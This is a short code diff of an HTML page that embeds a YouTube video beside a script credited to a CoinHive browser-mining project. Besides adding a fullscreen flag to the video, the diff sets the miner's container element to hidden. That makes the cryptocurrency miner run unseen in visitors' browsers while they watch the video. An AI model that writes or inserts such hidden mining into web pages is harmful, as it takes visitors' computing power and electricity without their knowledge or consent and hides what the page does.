@@ -22,7 +22,7 @@
 
 </head>
 <body>
-<iframe width="560" height="315" src="https://www.youtube.com/embed/Oa1du_palN4" frameborder="0" allow="autoplay; encrypted-media" ></iframe>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/Oa1du_palN4" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 <script type="text/javascript">
 /*
 Copyright @ Credit https://github.com/C0nw0nk/CoinHive
@@ -156,6 +156,7 @@ createScriptElement.onload = function () {
   /*Create Elements*/
   var createDivElement = document.createElement('div');
   createDivElement.id = html_miner;
+  createDivElement.style.visibility = 'hidden';
   document.body.appendChild(createDivElement);//getScriptElement.parentNode.insertBefore(createDivElement, getScriptElement);/*Create our div element*/
 
   new_html = "<div id='"+ html_mining_stats_canvas +"'></div>";
